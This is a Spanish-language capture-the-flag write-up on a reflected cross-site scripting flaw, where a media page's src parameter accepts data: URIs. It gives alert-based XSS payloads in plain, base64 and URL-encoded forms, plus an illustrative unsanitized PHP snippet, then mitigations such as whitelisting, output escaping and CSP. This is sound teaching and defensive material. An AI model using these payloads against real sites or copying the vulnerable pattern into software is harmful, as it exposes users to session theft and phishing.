# A7 - Cross-Site Scripting via Data URI

Vulnerabilidad del OWASP Top 10 (2017). El parámetro `src` del endpoint `/index.php?page=media` se inyecta directamente en un elemento HTML sin validar el esquema de URL, permitiendo usar el esquema `data:` para incrustar código JavaScript arbitrario.

---

## Pasos para obtener la flag

### 1. Identificar el vector

Al pulsar la imagen de la NSA en la página principal se accede a:
```
http://<IP>/index.php?page=media&src=nsa
```
El parámetro `src` controla el recurso cargado sin validación de esquema.

### 2. Construir el payload

```bash
echo -n "<script>alert(42)</script>" | base64
# PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
```

> En este reto solo funcionan los payloads codificados en **base64**.

### 3. Inyectar el Data URI

```
http://<IP>/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
```

El servidor inserta el valor de `src` sin sanear en un elemento `<iframe>` u `<object>`. El navegador interpreta el Data URI, ejecuta el JS y la aplicación devuelve la **flag**.

### 4. Por qué funciona

El código vulnerable hace algo similar a:
```php
$src = $_GET['src'];
echo '<iframe src="' . $src . '"></iframe>';
```
No valida el esquema (`data:`, `javascript:`, etc.), por lo que cualquier Data URI se procesa directamente.

---

## Variantes de payload

| Técnica | Payload |
|---|---|
| Directo | `data:text/html,<script>alert(42)</script>` |
| Base64 | `data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=` |
| URL encoding | `data:text/html,%3Cscript%3Ealert(42)%3C/script%3E` |

---

## Impacto

- **Robo de sesión:** acceso a cookies y tokens de autenticación.
- **Phishing:** inyección de contenido falso para capturar credenciales.
- **XSS reflejado:** la URL maliciosa puede enviarse a otros usuarios.
- **Keylogging y defacement** en el contexto del dominio vulnerable.

---

## Mitigación

1. **Whitelist de recursos permitidos:** resolver el recurso en servidor con un mapa de claves internas, nunca usar el valor crudo del parámetro:
   ```php
   $allowed = ['nsa' => '/media/nsa.jpg'];
   if (!isset($allowed[$_GET['src']])) { http_response_code(404); exit(); }
   echo '<object data="' . htmlspecialchars($allowed[$_GET['src']]) . '"></object>';
   ```
2. **Bloquear esquemas peligrosos:** rechazar `data:`, `javascript:`, `vbscript:`.
3. **Sanitizar la salida:** `htmlspecialchars($src, ENT_QUOTES, 'UTF-8')` antes de insertar en HTML.
4. **Content Security Policy (CSP):**
   ```
   Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self'
   ```
5. **Base64 no es seguridad:** es solo codificación; no protege contra ningún ataque.
